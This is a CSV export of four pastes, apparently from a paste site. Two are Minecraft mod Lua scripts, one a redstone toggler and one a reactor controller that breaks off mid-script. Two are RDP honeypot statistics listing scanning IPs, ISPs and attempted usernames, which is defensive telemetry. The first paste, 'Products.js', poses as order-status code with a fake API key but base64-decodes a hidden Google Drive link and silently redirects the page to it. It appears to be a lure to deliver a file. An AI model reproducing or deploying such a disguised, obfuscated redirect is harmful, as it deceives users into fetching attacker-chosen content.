id,title,username,language,date,content
wMZbFiwQ,Products.js,rodrigomaise99,JavaScript,Thursday 3rd of April 2025 07:19:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/760/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
F9531VFX,2025-04-02_stats.json,rdp_snitch,JSON,Thursday 3rd of April 2025 07:18:28 PM CDT,"{
  ""ip"": {
    ""156.146.57.174"": 8985,
    ""156.146.57.120"": 3039,
    ""138.199.24.6"": 65886,
    ""156.146.57.110"": 35907,
    ""150.95.89.149"": 8811,
    ""156.146.57.52"": 8979,
    ""106.14.144.233"": 429,
    ""146.190.105.191"": 2148,
    ""191.96.106.68"": 9612,
    ""199.45.155.90"": 3,
    ""194.187.176.9"": 3,
    ""185.7.214.81"": 15,
    ""205.210.31.38"": 9,
    ""167.94.138.184"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""91.238.181.93"": 6,
    ""188.166.250.11"": 6,
    ""91.238.181.94"": 6,
    ""119.40.84.186"": 3,
    ""147.182.229.114"": 750,
    ""138.199.24.8"": 9,
    ""185.147.124.165"": 9,
    ""92.255.57.86"": 6,
    ""178.63.252.130"": 3,
    ""185.103.103.248"": 3,
    ""205.210.31.23"": 9,
    ""157.245.104.150"": 15,
    ""92.255.85.59"": 12,
    ""185.42.12.5"": 18,
    ""157.245.156.139"": 6,
    ""206.168.34.56"": 3,
    ""198.235.24.107"": 9,
    ""138.199.24.30"": 2082,
    ""152.32.181.210"": 3,
    ""61.219.85.85"": 3,
    ""193.29.13.50"": 9,
    ""103.182.19.34"": 6,
    ""194.165.16.166"": 6,
    ""198.235.24.235"": 9,
    ""194.165.16.165"": 6,
    ""45.135.232.124"": 9,
    ""206.168.34.74"": 3
  },
  ""asn"": {
    ""AS212238"": 56910,
    ""AS60068"": 67977,
    ""AS135161"": 8811,
    ""AS37963"": 429,
    ""AS14061"": 2925,
    ""AS174"": 9612,
    ""AS398722"": 3,
    ""AS208843"": 3,
    ""AS207566"": 33,
    ""AS396982"": 36,
    ""AS398324"": 9,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""AS49434"": 12,
    ""AS24122"": 3,
    ""AS49505"": 9,
    ""AS24940"": 3,
    ""AS215590"": 3,
    ""AS59425"": 18,
    ""AS135377"": 3,
    ""AS3462"": 3,
    ""AS42397"": 9,
    ""AS63737"": 6,
    ""AS48721"": 12,
    ""AS198953"": 9
  },
  ""isp"": {
    ""Datacamp Limited"": 56910,
    ""DataCamp Limited"": 67977,
    ""GMO-Z.COM PTE. LTD."": 8811,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""DigitalOcean, LLC"": 2925,
    ""Cogent Communications"": 9612,
    ""Censys, Inc."": 12,
    ""Alpha Strike Labs GmbH"": 3,
    ""Chang Way Technologies Co. Limited"": 51,
    ""Google LLC"": 36,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""Datacenter location PAR1 France"": 12,
    ""BDCOM Online Limited"": 3,
    ""JSC Selectel"": 9,
    ""Hetzner Online GmbH"": 3,
    ""DpkgSoft International Limited"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Bunea TELECOM SRL"": 9,
    ""TINHVAN"": 6,
    ""Flyservers S.A."": 12,
    ""Proton66 OOO"": 9
  },
  ""org"": {
    ""Datacamp Limited"": 56910,
    ""Cdn77 SGP"": 67977,
    ""Zcom Thai"": 8811,
    ""Aliyun Computing Co., LTD"": 429,
    ""DigitalOcean, LLC"": 2919,
    ""Ipxo"": 9612,
    ""Censys, Inc."": 9,
    ""Alpha Strike Labs GmbH"": 3,
    ""Chang Way Technologies Co. Limited"": 33,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc"": 3,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Digitalocean"": 6,
    ""BDCOM Online Limited"": 3,
    ""Almira LLC"": 9,
    ""Rasoul Shamaei"": 3,
    ""DpkgSoft International Limited"": 3,
    ""Horizon LLC"": 18,
    ""Ucloud Information Technology"": 3,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Bunea TELECOM SRL"": 9,
    ""Tinh VAN Network Solutions Company Limited"": 6,
    ""Flyservers S.A"": 12,
    ""Proton66 LLC"": 9
  },
  ""regionName"": {
    ""North West"": 124887,
    ""Tokyo"": 8811,
    ""Shanghai"": 429,
    ""South West"": 2160,
    ""California"": 10398,
    ""Kowloon"": 3,
    ""Land Berlin"": 3,
    ""Moscow"": 69,
    ""Michigan"": 3,
    ""Virginia"": 9,
    ""North Holland"": 9,
    ""\u00cele-de-France"": 12,
    ""Dhaka Division"": 3,
    ""Saxony"": 3,
    ""Stockholm County"": 3,
    ""Karnataka"": 15,
    ""Illinois"": 6,
    ""Dubai"": 3,
    ""New Taipei City"": 3,
    ""Timi\u0219 County"": 9,
    ""Hanoi"": 6,
    ""Kaunas"": 12
  },
  ""country"": {
    ""Singapore"": 127047,
    ""Japan"": 8811,
    ""China"": 429,
    ""United States"": 10416,
    ""Hong Kong"": 3,
    ""Germany"": 6,
    ""Russia"": 69,
    ""The Netherlands"": 9,
    ""France"": 12,
    ""Bangladesh"": 3,
    ""Sweden"": 3,
    ""India"": 15,
    ""United Arab Emirates"": 3,
    ""Taiwan"": 3,
    ""Romania"": 9,
    ""Vietnam"": 6,
    ""Lithuania"": 12
  },
  ""account"": {
    ""hello"": 146682,
    ""(empty)"": 12,
    ""user"": 3,
    ""Administr"": 42,
    ""pibaSXQDS"": 3,
    ""OVfIvN"": 3,
    ""ATsCFL"": 3,
    ""Domain"": 42,
    ""Test"": 36,
    ""YAmReehCP"": 3,
    ""ZQpUAz"": 3,
    ""ccFSxr"": 3,
    ""kSOWaRlbv"": 3,
    ""JUOHjP"": 3,
    ""HLJQlz"": 3,
    ""Administrator"": 3,
    ""jatUOeHuV"": 3,
    ""JNqsty"": 3,
    ""rrEtmJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 146856
  },
  ""client_build"": {
    ""Unknown"": 146856
  },
  ""client_name"": {
    ""Unknown"": 146856
  },
  ""ip_type"": {
    ""hosting & proxy"": 128235,
    ""hosting"": 8880,
    ""proxy"": 9663,
    ""Unknown"": 78
  }
}"
2ZJEXLhp,ComputerCraft Redstone State Toggler,Sv443,Lua,Thursday 3rd of April 2025 07:18:12 PM CDT,"-- If this side receives a pulse, the computer switches to the next state
TOGGLE_SIDE = ""right""

-- Cooldown between accepting pulses
-- Set to 0 to disable
-- Has to be a multiple of 0.1 (1 redstone tick)
TOGGLE_COOLDOWN = 1

-- All redstone states that can be toggled between
-- First layer is what gets switched between when TOGGLE_SIDE receives a pulse
-- Second layer is a list of {""side"", value, beforeDelay, afterDelay} pairs (delays are optional, multiple of 0.1)
-- The example below is perfect for using two regular pistons pointing at each other to swap two blocks:
STATES = {
    {
        {""right"", 0, nil, 0.1},
        {""left"", 15}
    },
    {
        {""left"", 0, nil, 0.1},
        {""right"", 15}
    },
}

-- Whether the computer goes down the list of states (1) or up (-1)
-- Other values are also valid, though when wrapping around, the state will always be set to the first or last
STATE_INCREMENT = 1

-- Whether to save the state between reboots, MP server restarts, SP world rejoins, etc.
PERSIST_STATE = true

-- Whether to add a delay between receiving the pulse and toggling the state
-- Set to 0 to disable
STATE_TOGGLE_DELAY = 0

-- Which number state in the STATES list the computer starts with
INITIAL_STATE_INDEX = 1

-- The initial signal to set on all sides when the computer starts (0-15)
INITIAL_SIGNAL = 0




-- Do not edit below or cobuder gets angry >:(




-- #region loop

-- current state index, used when calling applyState()
local stateIdx = INITIAL_STATE_INDEX
local lastToggleTime = 0

function loop()
    local toggleState = redstone.getInput(TOGGLE_SIDE)
    local currentTime = os.clock()

    if toggleState and currentTime - lastToggleTime > TOGGLE_COOLDOWN then
        lastToggleTime = currentTime

        if STATE_TOGGLE_DELAY > 0 then
            sleep(STATE_TOGGLE_DELAY)
        end

        stateIdx = stateIdx + STATE_INCREMENT
        if stateIdx > #STATES then
            stateIdx = 1
        elseif stateIdx < 1 then
            stateIdx = #STATES
        end

        applyState()
        print(""* Applied state "" .. stateIdx)
    end
end

function applyState()
    for _, sideVal in ipairs(STATES[stateIdx]) do
        if sideVal[3] ~= nil and sideVal[3] > 0 then
            sleep(sideVal[3])
        end
        redstone.setAnalogOutput(sideVal[1], sideVal[2])
        if sideVal[4] ~= nil and sideVal[4] > 0 then
            sleep(sideVal[4])
        end
    end
    if PERSIST_STATE then
        settings.set(""stateIdx"", stateIdx)
        settings.save()
    end
end

function b64dec(data)
    local b = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/""
    data = string.gsub(data, ""[^""..b..""=]"", """")

    return (data:gsub(""."", function(x)
        if x == ""="" then return """" end
        local r, f = """", (b:find(x) - 1)
        for i = 6, 1, -1 do
            r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and ""1"" or ""0"")
        end
        return r
    end):gsub(""%d%d%d?%d?%d?%d?%d?%d?"", function(x)
        if #x ~= 8 then return """" end
        local c = 0
        for i = 1, 8 do
            c = c + (x:sub(i, i) == ""1"" and 2 ^ (8 - i) or 0)
        end
        return string.char(c)
    end))
end

--#region run

function run()
    -- cause pastebin hates links
    print(b64dec(""CnwgU3RhdGVUb2dnbGUgYnkgU3Y0NDMKfCBzdjQ0My5uZXQvci9jYy1wcm9qZWN0cwo=""))

    for _, side in pairs({""left"", ""right"", ""top"", ""bottom"", ""front"", ""back""}) do
        redstone.setAnalogOutput(side, INITIAL_SIGNAL or 0)
    end

    stateIdx = settings.get(""stateIdx"") or INITIAL_STATE_INDEX
    applyState()
    print(""* Applied initial state "" .. stateIdx)

    while true do
        loop()
        sleep(0.1)
    end
end

run()
"
7r0XLx6J,2025-04-02_stats.json,rdp_snitch,JSON,Thursday 3rd of April 2025 07:16:22 PM CDT,"{
  ""ip"": {
    ""156.146.57.174"": 8984,
    ""156.146.57.120"": 3039,
    ""138.199.24.6"": 65886,
    ""156.146.57.110"": 35907,
    ""150.95.89.149"": 8811,
    ""156.146.57.52"": 8979,
    ""106.14.144.233"": 429,
    ""146.190.105.191"": 2148,
    ""191.96.106.68"": 9612,
    ""199.45.155.90"": 3,
    ""194.187.176.9"": 3,
    ""185.7.214.81"": 15,
    ""205.210.31.38"": 9,
    ""167.94.138.184"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""91.238.181.93"": 6,
    ""188.166.250.11"": 6,
    ""91.238.181.94"": 6,
    ""119.40.84.186"": 3,
    ""147.182.229.114"": 750,
    ""138.199.24.8"": 9,
    ""185.147.124.165"": 9,
    ""92.255.57.86"": 6,
    ""178.63.252.130"": 3,
    ""185.103.103.248"": 3,
    ""205.210.31.23"": 9,
    ""157.245.104.150"": 15,
    ""92.255.85.59"": 12,
    ""185.42.12.5"": 18,
    ""157.245.156.139"": 6,
    ""206.168.34.56"": 3,
    ""198.235.24.107"": 9,
    ""138.199.24.30"": 2082,
    ""152.32.181.210"": 3,
    ""61.219.85.85"": 3,
    ""193.29.13.50"": 9,
    ""103.182.19.34"": 6,
    ""194.165.16.166"": 6,
    ""198.235.24.235"": 9,
    ""194.165.16.165"": 6,
    ""45.135.232.124"": 9,
    ""206.168.34.74"": 3
  },
  ""asn"": {
    ""AS212238"": 56909,
    ""AS60068"": 67977,
    ""AS135161"": 8811,
    ""AS37963"": 429,
    ""AS14061"": 2925,
    ""AS174"": 9612,
    ""AS398722"": 3,
    ""AS208843"": 3,
    ""AS207566"": 33,
    ""AS396982"": 36,
    ""AS398324"": 9,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""AS49434"": 12,
    ""AS24122"": 3,
    ""AS49505"": 9,
    ""AS24940"": 3,
    ""AS215590"": 3,
    ""AS59425"": 18,
    ""AS135377"": 3,
    ""AS3462"": 3,
    ""AS42397"": 9,
    ""AS63737"": 6,
    ""AS48721"": 12,
    ""AS198953"": 9
  },
  ""isp"": {
    ""Datacamp Limited"": 56909,
    ""DataCamp Limited"": 67977,
    ""GMO-Z.COM PTE. LTD."": 8811,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""DigitalOcean, LLC"": 2925,
    ""Cogent Communications"": 9612,
    ""Censys, Inc."": 12,
    ""Alpha Strike Labs GmbH"": 3,
    ""Chang Way Technologies Co. Limited"": 51,
    ""Google LLC"": 36,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""Datacenter location PAR1 France"": 12,
    ""BDCOM Online Limited"": 3,
    ""JSC Selectel"": 9,
    ""Hetzner Online GmbH"": 3,
    ""DpkgSoft International Limited"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Bunea TELECOM SRL"": 9,
    ""TINHVAN"": 6,
    ""Flyservers S.A."": 12,
    ""Proton66 OOO"": 9
  },
  ""org"": {
    ""Datacamp Limited"": 56909,
    ""Cdn77 SGP"": 67977,
    ""Zcom Thai"": 8811,
    ""Aliyun Computing Co., LTD"": 429,
    ""DigitalOcean, LLC"": 2919,
    ""Ipxo"": 9612,
    ""Censys, Inc."": 9,
    ""Alpha Strike Labs GmbH"": 3,
    ""Chang Way Technologies Co. Limited"": 33,
    ""Palo Alto Networks, Inc"": 36,
    ""Censys, Inc"": 3,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Digitalocean"": 6,
    ""BDCOM Online Limited"": 3,
    ""Almira LLC"": 9,
    ""Rasoul Shamaei"": 3,
    ""DpkgSoft International Limited"": 3,
    ""Horizon LLC"": 18,
    ""Ucloud Information Technology"": 3,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Bunea TELECOM SRL"": 9,
    ""Tinh VAN Network Solutions Company Limited"": 6,
    ""Flyservers S.A"": 12,
    ""Proton66 LLC"": 9
  },
  ""regionName"": {
    ""North West"": 124886,
    ""Tokyo"": 8811,
    ""Shanghai"": 429,
    ""South West"": 2160,
    ""California"": 10398,
    ""Kowloon"": 3,
    ""Land Berlin"": 3,
    ""Moscow"": 69,
    ""Michigan"": 3,
    ""Virginia"": 9,
    ""North Holland"": 9,
    ""\u00cele-de-France"": 12,
    ""Dhaka Division"": 3,
    ""Saxony"": 3,
    ""Stockholm County"": 3,
    ""Karnataka"": 15,
    ""Illinois"": 6,
    ""Dubai"": 3,
    ""New Taipei City"": 3,
    ""Timi\u0219 County"": 9,
    ""Hanoi"": 6,
    ""Kaunas"": 12
  },
  ""country"": {
    ""Singapore"": 127046,
    ""Japan"": 8811,
    ""China"": 429,
    ""United States"": 10416,
    ""Hong Kong"": 3,
    ""Germany"": 6,
    ""Russia"": 69,
    ""The Netherlands"": 9,
    ""France"": 12,
    ""Bangladesh"": 3,
    ""Sweden"": 3,
    ""India"": 15,
    ""United Arab Emirates"": 3,
    ""Taiwan"": 3,
    ""Romania"": 9,
    ""Vietnam"": 6,
    ""Lithuania"": 12
  },
  ""account"": {
    ""hello"": 146681,
    ""(empty)"": 12,
    ""user"": 3,
    ""Administr"": 42,
    ""pibaSXQDS"": 3,
    ""OVfIvN"": 3,
    ""ATsCFL"": 3,
    ""Domain"": 42,
    ""Test"": 36,
    ""YAmReehCP"": 3,
    ""ZQpUAz"": 3,
    ""ccFSxr"": 3,
    ""kSOWaRlbv"": 3,
    ""JUOHjP"": 3,
    ""HLJQlz"": 3,
    ""Administrator"": 3,
    ""jatUOeHuV"": 3,
    ""JNqsty"": 3,
    ""rrEtmJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 146855
  },
  ""client_build"": {
    ""Unknown"": 146855
  },
  ""client_name"": {
    ""Unknown"": 146855
  },
  ""ip_type"": {
    ""hosting & proxy"": 128234,
    ""hosting"": 8880,
    ""proxy"": 9663,
    ""Unknown"": 78
  }
}"
r2ER4AVR,Draconic Control v15.0b [xAID] [Lua 5.3 / 5.2],neuroticfox,Lua,Thursday 3rd of April 2025 07:16:18 PM CDT,"-- Dear Programmer:
-- When we wrote this code, only god and
-- us understood how it worked. And now
-- only god knows.
--
-- Therefore, if you are trying to optimize
-- this script and it fails (Very likely),
-- please increase this counter for the next
-- person. 
--
-- wastedHours = 541

 :: start ::
 -- Locals & Requirements
	local component = require(""component"")
	local event = require(""event"")
	local term = require(""term"")
	local gpu = component.gpu
	local screen = component.screen
	local unicode= require(""unicode"")
	local reactorOutputMultiplier = 1
	local cutoffTemp = 9005
	local chaosMode = 0
	local tempDrop = 0
	local devMode = 0
	local fieldAdj = 0
	local deviation = 0
	local cVar = ""DEV RELEASE: Use at your own risk.""
	local tArgs = {...}
	local Arg0 = tonumber(tArgs[1])
	local Arg1 = tonumber(tArgs[2])
	local Arg2 = tonumber(tArgs[3])
	local Arg3 = tonumber(tArgs[4])
	local Arg4 = tostring(tArgs[5])
	local Arg5 = tostring(tArgs[6])
	local ratioX, ratioY = screen.getAspectRatio()
	local maxX, maxY = gpu.maxResolution()
	gpu.setResolution(math.min(ratioX*55, maxX), math.min(ratioY*25,maxY))
term.clear()
term.setCursor(0, 0)
os.sleep(0.5)
 -- pArgs
if not Arg0 then 
os.execute(cls)
print(""Draconic Control 14"")
print(""1.12 - 1.16 Compatible-ish"")
print()
print(""dc14 [Mult] [Temp] [Field] [Mode]"")
print()
print(""Arguments"")
print()
print(""[Mult]			-	Reactor Output Multiplier"")
print(""1.16 [10]			1.12 [1]"")
print()
print(""[Temp]			-	Desired Reactor Temperature"")
print(""Default [8000]			Range [2500-8000]"")
print()
print(""[Field]			-	Desired Field Strength"")
print(""Default [15]			Range [0.5-99]"")
print()
print(""[Mode]			-	Set Desired Program Mode"")
print(""Default [1]			Range [1-3]"")
print(""[1-3]			-	Simple, Dev, noGUI"")
print()
print(""       Compiled by BrokenSynapse & AwesomeAlec1"")
print()
print(""Thanks to Maurdekye for creating the base of this program:"")
print(""             https://youtu.be/iLvkk41K84E"")
print()
print("" Thanks to AwesomeAlec1 for creating the control script:"")
print(""             https://youtu.be/CLku1ckXpeU"")
print()
print(""  Thanks to MightyPirates for being so gracious as to"")
print(""   let me fix what they broke by never using Lua 5.3"")
print()
print(""   And a very special thanks to ZanBorg for breaking"")
print(""      this script until it doesn't break anymore."")
goto fin
end
 -- sArgs
local reactorOutputMultiplier = Arg0
local idealTemp = Arg1 or 8000
local idealField = Arg2 or 15
local Mode = Arg3 or 1
 -- Components
	if not component.isAvailable(""draconic_reactor"") then
		print(""Reactor not connected. Please connect computer to reactor with an Adapter block."")
		os.exit()
	end
	local reactor = component.draconic_reactor
	local info = reactor.getReactorInfo()
	local fluxGates = {}
	for x,y in pairs(component.list(""flux_gate"")) do
		fluxGates[#fluxGates+1] = x
	end
	if #fluxGates < 2 then
		print(""Not enough flux gates connected; please connect inflow and outflow flux gates with Adapter blocks."")
		os.exit()
	end
	local inputFlux = component.proxy(fluxGates[1])
	local outputFlux = component.proxy(fluxGates[2])
	outputFlux.setOverrideEnabled(true)
	inputFlux.setOverrideEnabled(true)
	if not inputFlux or not outputFlux then
		print(""Not enough flux gates connected; please connect inflow and outflow flux gates with Adapter blocks."")
		os.exit()
	end
 -- AutoSet Gates
		reactor.chargeReactor()
		satOne = info.energySaturation
		fieldOne = info.fieldStrength
		inputFlux.setFlowOverride(1.0)
		os.sleep(0.5)
		satTwo = info.energySaturation
		fieldTwo = info.fieldStrength
		inputFlux.setFlowOverride(0.0)
		reactor.stopReactor()
	if satTwo <= satOne or fieldTwo <= fieldOne then
	local oldAddr = inputFlux.address
      inputFlux = component.proxy(outputFlux.address)
      outputFlux = component.proxy(oldAddr)
	end

 -- Functions
 
function exit_msg(msg)
	term.clear()
	print(msg)
	os.exit()
end
function modifyTemp(offset)
	local newTemp = idealTemp + offset
	if newTemp > 8000 and Mode == 1 then
		newTemp = 8000
	elseif newTemp > 8000 and Mode == 2 and chaosmode == 0 then
		newTemp = 8000
	elseif newTemp > 18000 and chaosmode == 1 then
		newTemp = 18000
	elseif newTemp < 2000 then
		newTemp = 2000
	end
		idealTemp = newTemp
	end
function modifyField(offset)
	local newField = idealField + offset
	if newField > 99 then
		newField = 99
	elseif newField < 100 and chaosMode == 1 then
		newField = 100
	elseif newField < 0.5 and Mode == 1 or Mode == 3 then
		newField = 0.5
	elseif newField < 0.125 and Mode == 2 then
		newField = 0.125
	end
		idealField = newField
	end
	
 -- Buttons
	local adj_button_width = 19
	local tempOffsetX = 62
	local tempOffsetY = 2
	local fieldOffsetX = tempOffsetX + adj_button_width + 2
	local fieldOffsetY = 2
	local cutoffField = 0.75
	highest_use = 0.1
	local buttons = {
	startButton={
    x=2,
    y=20,
    width=18,
    height=1,
    text=""Start"",
	textcolor = 0x0000AA,
    action=function()
      if info.status == ""cooling"" or info.status == ""cold"" then
			chaosMode = 0
			idealField = Arg2
			cutoffField = 0.4
			idealTemp = Arg1
			startingVar = 1
			cVar = ""Do not use Chaos Mode with less than one block of fuel""
        reactor.chargeReactor()
      elseif info.status == ""stopping"" then
			chaosMode = 0
			idealField = Arg2
			cutoffField = 0.4
			idealTemp = Arg1
			startingVar = 0
			cVar = ""Do not use Chaos Mode with less than one block of fuel""
        reactor.activateReactor()
      end
    end,
	condition=function() return info.status ~= ""running"" and info.status ~= ""warming_up"" end
  },
  shutdownButton={
    x=2,
    y=20,
    width=18,
    height=1,
    text=""Shutdown"",
	textcolor = 0xAA0000,
    action=function()
    cutoffTemp = 9000
    idealTemp = Arg1
    cutoffField = 0.4
	cVar = ""Do not use Chaos Mode with less than one block of fuel""
      state = ""MASD""
      reactor.stopReactor()
    end,
	condition=function() return info.status == ""running"" or info.status == ""warming_up"" end
  },
  chaosMode={
    x=2,
    y=22,
    width=18,
    height=1,
    text="" Chaos Mode"",
	textcolor = 0x800080,
    action=function()
		if chaosMode == 0 then
			chaosMode = 1
			cutoffTemp = 18000
			idealTemp = 18000
			idealField = 100
			cutoffField = 5
			idealTemp = 8000
		elseif chaosMode == 1 then
			chaosMode = 0
			idealField = Arg2
			cutoffField = 0.4
			idealTemp = Arg1
		end
    end,
    condition=function() return Mode == 2 and info.status == ""running"" end
  },
  forceExit={
    x=158,
    y=1,
    width=3,
    height=1,
    text="" X "",
	textcolor = 0xB00000,
    action=function()
		inputFlux.setFlowOverride(250000.0)
		chaosMode = 0
		idealField = 99
		cutoffField = 0.4
		idealTemp = Arg1
      reactor.stopReactor()
      gpu.setResolution(gpu.maxResolution())
	  event_loop = false
	  os.execute(""cls"")
    end,
--    condition=function() return running or shutting_down end
  },
  Update={
    x=22,
    y=22,
    width=18,
    height=1,
    text=""Update"",
    action=function()
		reactor.stopReactor()
		os.execute(""cd /home; pastebin get -f YZK9hTBU dc14; cls; dc14"")
    end,
	condition=function() return info.status ~= ""running"" and info.status ~= ""warming_up"" end
  },
  switchGates={
    x=2,
    y=22,
    width=18,
    height=1,
    text=""Swap Flux Gates"",
    action=function()
      cutoffTemp = 10500
      local old_addr = inputFlux.address
      inputFlux = component.proxy(outputFlux.address)
      outputFlux = component.proxy(old_addr)
    end,
	condition=function() return info.status == ""cooling"" or info.status == ""cold"" or info.status == ""stopping"" end
  },
  tempMax={
    x=tempOffsetX,
    y=tempOffsetY,
    width=adj_button_width,
    height=1,
    text=""Maximum"",
	textcolor = 0x552222,
    action=function()
    idealTemp = 8000 end
  },
  tempPThousand={
    x=tempOffsetX,
    y=tempOffsetY+2,
    width=adj_button_width,
    height=1,
    text=""+1000"",
	textcolor = 0x552222,
    action=function() modifyTemp(1000) end
  },
  tempPHundred={
    x=tempOffsetX,
    y=tempOffsetY+4,
    width=adj_button_width,
    height=1,
    text=""+100"",
	textcolor = 0x552222,
    action=function() modifyTemp(100) end
  },
  tempPTen={
    x=tempOffsetX,
    y=tempOffsetY+6,
    width=adj_button_width,
    height=1,
    text=""+10"",
	textcolor = 0x552222,
    action=function() modifyTemp(10) end
  },
  tempPOne={
    x=tempOffsetX,
    y=tempOffsetY+8,
    width=adj_button_width,
    height=1,
    text=""+1"",
	textcolor = 0x552222,
    action=function() modifyTemp(1) end
  },
  tempMin={
    x=tempOffsetX,
    y=tempOffsetY+20,
    width=adj_button_width,
    height=1,
    text=""Minimum"",
	textcolor = 0x552222,
    action=function() modifyTemp(-20000) end
  },
  tempMThousand={
    x=tempOffsetX,
    y=tempOffsetY+18,
    width=adj_button_width,
    height=1,
    text=""-1000"",
	textcolor = 0x552222,
    action=function() modifyTemp(-1000) end
  },
  tempMHundred={
    x=tempOffsetX,
    y=tempOffsetY+16,
    width=adj_button_width,
    height=1,
    text=""-100"",
	textcolor = 0x552222,
    action=function() modifyTemp(-100) end
  },
  tempMTen={
    x=tempOffsetX,
    y=tempOffsetY+14,
    width=adj_button_width,
    height=1,
    text=""-10"",
	textcolor = 0x552222,
    action=function() modifyTemp(-10) end
  },
  tempMOne={
    x=tempOffsetX,
    y=tempOffsetY+12,
    width=adj_button_width,
    height=1,
    text=""-1"",
	textcolor = 0x552222,
    action=function() modifyTemp(-1) end
  },
  fieldPTen={
    x=fieldOffsetX,
    y=fieldOffsetY+1,
    width=adj_button_width,
    height=1,
    text=""+10"",
	textcolor = 0x222299,
    action=function() modifyField(10) end
  },
    fieldPOne={
    x=fieldOffsetX,
    y=fieldOffsetY+3,
    width=adj_button_width,
    height=1,
    text=""+1"",
	textcolor = 0x222299,
    action=function() modifyField(1) end
  },
  fieldPTenth={
    x=fieldOffsetX,
    y=fieldOffsetY+5,
    width=adj_button_width,
    height=1,
    text=""+0.1"",
	textcolor = 0x222299,
    action=function() modifyField(0.1) end
  },
    fieldPThou={
    x=fieldOffsetX,
    y=fieldOffsetY+7,
    width=adj_button_width,
    height=1,
    text=""+0.005"",
	textcolor = 0x222299,
    action=function() modifyField(0.005) end
  },
  fieldMTen={
    x=fieldOffsetX,
    y=fieldOffsetY+19,
    width=adj_button_width,
    height=1,
    text=""-10"",
	textcolor = 0x222299,
    action=function() modifyField(-10) end
  },
    fieldMOne={
    x=fieldOffsetX,
    y=fieldOffsetY+17,
    width=adj_button_width,
    height=1,
    text=""-1"",
	textcolor = 0x222299,
    action=function() modifyField(-1) end
  },
  fieldMTenth={
    x=fieldOffsetX,
    y=fieldOffsetY+15,
    width=adj_button_width,
    height=1,
    text=""-0.1"",
	textcolor = 0x222299,
    action=function() modifyField(-0.1) end
   },
     fieldMThou={
    x=fieldOffsetX,
    y=fieldOffsetY+13,
    width=adj_button_width,
    height=1,
    text=""-0.005"",
	textcolor = 0x222299,
    action=function() modifyField(-0.005) end
   }
}
 -- Control Loop
event_loop = true
while event_loop do
:: loopstart ::
		info = reactor.getReactorInfo()
	if not info or info.maxFuelConversion < 0.001 then 
	cutoffTemp = 9000
	idealTemp = Arg1
	chaosMode = 0
	gpu.setBackground(0x000000)
	gpu.setForeground(0xFF0000)
	term.setCursor(55, 1)
	print ""Please verify that your reactor is refueled.""
	term.setCursor(55, 2)
	print ""Please verify the integrity of your reactor.""
	goto start
	gpu.setForeground(0x000000)
	end
	if info.temperature >= 2000 and info.status ~= ""stopping""  then
		reactor.activateReactor()
	end
	
 -- Chaos Mode Safe Shutdown
	if info.temperature > 18000 and chaosMode == 1 and tempDrop == 0 then
		idealTemp = 16000
		tempDrop = 1
		cVar = ""Cooling For Shutdown""
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 8 and chaosMode == 1  and tempDrop == 1 then 
		idealTemp = 14000
		tempDrop = 2
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 12.5 and chaosMode == 1  and info.maxFuelConversion < 1297 then
		idealTemp = 8000
		idealField = 99
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 1.3 and chaosMode == 1  and tempDrop == 2 and info.maxFuelConversion < 5185 then
		idealTemp = 8000
		idealField = 25
	elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 1 and chaosMode == 1  and tempDrop == 2 then
		idealTemp = 8000
		idealField = 25
    end
 
 -- Auto Adjust Offset
 
	if info.temperature == idealTemp and ((info.fieldStrength / info.maxFieldStrength) * 100) < idealField and chaosMode ~= 1 then
		fieldAdj = (idealField - ((info.fieldStrength / info.maxFieldStrength) * 100))
    end

	local targetShieldPercent = idealField or 15 -- Desired shield strength
	local targetShield = (targetShieldPercent / 100)
	
 -- Reactor equation variables

	local targetTemp50  = math.min((tonumber(idealTemp) / 10000.0) * 50.0, 99.0)
    local coreSat       = tonumber(info.energySaturation) / tonumber(info.maxEnergySaturation)
